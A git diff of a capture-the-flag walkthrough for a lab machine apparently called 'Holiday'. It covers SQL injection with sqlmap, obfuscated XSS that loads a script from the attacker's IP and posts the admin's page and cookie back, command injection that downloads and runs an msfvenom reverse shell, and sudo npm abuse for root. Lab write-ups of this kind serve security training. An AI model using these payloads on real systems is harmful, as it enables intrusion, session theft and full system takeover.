@@ -18,8 +18,11 @@ PORT     STATE SERVICE VERSION
 |_http-title: Error
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 ```
-![[Pasted image 20251025220517.png]]
-![[Pasted image 20251025220502.png]]
+- test with generic endpoint we see that `/login` returns a login page
+![[login page.png]]
+- capture the request to `/login`
+![[burpsuite capture request.png]]
+- attempt to fuzzing endpoints with `ffuf` using `User-Agent` captured
 ```bash
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.29.106:8000/FUZZ -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
 <SNIP>
@@ -29,7 +32,9 @@ css                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 
 logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 65ms]
 img                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 68ms]
 ```
-
+- we get `admin` endpoint
+- capture the `burpsuite` request to `/login` endpoint with a login attempt and save it to a file
+- try `sqli` with `sqlmap`
 ```bash
 $ sqlmap -r ./login.post --level 5 --risk 3 --batch
         ___
@@ -97,7 +102,9 @@ back-end DBMS: SQLite
 
 [*] ending @ 00:08:24 /2025-10-26/
 ```
-
+- we get `username` field is inject-able 
+- enumerate the database
+- we see 5 tables 
 ```sql
 [5 tables]
 +-----------------+
@@ -108,7 +115,7 @@ back-end DBMS: SQLite
 | users           |
 +-----------------+
 ```
-
+- check user table and we get the login to the site
 ```sql
 Table: users
 [1 entry]
@@ -118,27 +125,23 @@ Table: users
 | 1  | 1      | fdc8cd4cff2c19e0d1022e78481ddf36 | RickA    |
 +----+--------+----------------------------------+----------+
 ```
-
 - use `crackstation`, we get the plain text for hash `nevergonnagiveyouup`
 - we are presented with the booking info 
-![[Pasted image 20251026025300.png]]
+![[bookings page.png]]
 - click on a `UUID` of a booking
 - we can add a note to a booking 
-![[Pasted image 20251026025346.png]]
+![[add note to booking.png]]
 - and at the bottom of the `Add note` form, we get a text ` All notes must be approved by an administrator - this process can take up to 1 minute.`
 #### Initial Foothold 
-
-```html
-document.write('<script src="http://10.10.16.56:8000/holiday.js"></script>');
-<img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.16.56:8000/holiday.js"></script>');)</script>">
-
+- from the text we get we might be able to perform some attack against the administrator 
+- we can attempt to perform `xss` against the form
+- attempt injecting `<img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.16.56:8000/holiday.js"></script>');)</script>">` but got no response 
+- attempt with base 10 `charcode` encoding using `cyberchef`
+```js
 ## based 10 on cyber chef
 <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,53,54,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>">
 ```
-
-- from the text we get we might be able to perform some attack against the administrator 
-- to test if we get a connection first use nc and listen at port 8000 if we get response back then we can proceed further
-
+- we get a connection back on port 8000
 ```bash
 $ nc -lvnp 80                                            
 listening on [any] 80 ...
@@ -152,43 +155,10 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,*
 Host: 10.10.16.56
 ```
-
-- we can attempt to read cookie with the aforementioned file
-```js
-// send the request back to target server
-var req1 = new XMLHttpRequest();
-req1.open('GET','http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65',true);
-res1 = req1.send();
-//send the response back to us
-var req2 = new XMLHttpRequest();
-req2.open('POST','http://10.10.16.56:8000/submit',true);
-req2.setRequestHeader('Content-Type', 'application/json');
-req2.send();
-```
-
-
-```bash
-## holiday.js
-var x=new XMLHttpRequest();x.open('POST','http://10.10.16.56:8000/',true);x.send();
-
-
-## response
-$ nc -lvnp 8000                                          
-listening on [any] 8000 ...
-connect to [10.10.16.56] from (UNKNOWN) [10.129.29.106] 36536
-POST / HTTP/1.1
-User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
-Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
-Origin: http://localhost:8000
-Accept: */*
-Content-Length: 0
-Content-Type: application/x-www-form-urlencoded
-Connection: Keep-Alive
-Accept-Encoding: gzip, deflate
-Accept-Language: en-GB,*
-Host: 10.10.16.56:8000
-```
-
+- since that the referrer is made by `localhost` we can attempt to exploit this by first injecting `javascript` code into a file that we are letting admin to fetch from us 
+- the code performs action on getting the page at `http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65` and post the response back to us 
+- as we are wanting to fetch cookie from user
+- refer to below code for `POC`
 ```js
 //below code worked
 var a = new XMLHttpRequest();
@@ -201,7 +171,7 @@ a.onload = function() {
 };
 a.send();
 ```
-
+- we get the file back
 ```html
 $ nc -lvnp 8000
 listening on [any] 8000 ...
@@ -281,30 +251,41 @@ Host: 10.10.16.56:8000
 ```js
 name="cookie" value="connect.sid&#x3D;s%3A5af8f150-b338-11f0-b086-bf3cecaed270.z02EfQGKuFK0e161%2FauiTQDRe%2Fg1CS2Ij0ojIW6xm0E">
 ```
-
-![[Pasted image 20251027063411.png]]
-
-![[Pasted image 20251027063453.png]]
-![[Pasted image 20251027065124.png]]
+- hijack the cookie and we see `Admin` tab
+![[admin cookie hijacking.png]]
+- go to `/admin` endpoint and see `Bookings` and `Notes` tab 
+- when clicking on them downloads two text files containing `booking` and `notes`
+![[Hard/Holiday/admin dash.png]]
+- capture the download request using `burpsuite` and attempt to perform command injection
+- we get error with `;`
+![[test chars.png]]
 - error we get is `Invalid table name - only characters in the range of [a-z0-9&\s\/] are allowed`
-
-- attempt with  `url encode`
-![[Pasted image 20251027065915.png]]
-![[Pasted image 20251027071921.png]]
-
-![[Pasted image 20251027072913.png]]
+- attempt with  `url encode`, lists the directory files
+![[test chars bypass.png]]
+- to exploit this my logic is first generate the `exf` payload using `msfvenom`
+- then using `wget` to load the `reverse shell payload` to target while encoding the `ip address` to decimal
+![[wget injection.png]]
+- once we have loaded the reverse shell
+- grant execution permission & invoke the shell
+```js
+//chmod 777 /home/algernon/app/payload 
+GET /admin/export?table=notes%26chmod%20777%20/home/algernon/app/payload 
+// home/algernon/app/payload
+GET /admin/export?table=notes%26/home/algernon/app/payload
+```
+- we get a shell back as `algernon`
 ```bash
 $ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.82] from (UNKNOWN) [10.129.29.106] 43094
 whoami
 algernon
-
 ```
 #### Lateral Movement (If any)
 
 #### Privilege Escalation
-
+- load and run `linpeas`
+- found we have `sudo -l` right, need to get interactive shell first
 ```bash
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
@@ -318,7 +299,8 @@ algernon ALL=(ALL) NOPASSWD: /usr/bin/npm i *
 Sudoers file: /etc/sudoers.d/node_modules is readable
 grep: /etc/sudoers.d/node_modules: Is a directory
 ```
-
+- to exploit `npm` install with `sudo` right 
+- first create a malicious page, im adding set user ID bit so we can run bash as root
 ```bash
 algernon@holiday:/tmp/exploit-package$ cat package.json 
 {
@@ -329,8 +311,7 @@ algernon@holiday:/tmp/exploit-package$ cat package.json
   }
 }
 ```
-
-
+- then perform installation and we get access as root
 ```
 algernon@holiday:/tmp/exploit-package$ sudo /usr/bin/npm i . --unsafe-perm
 
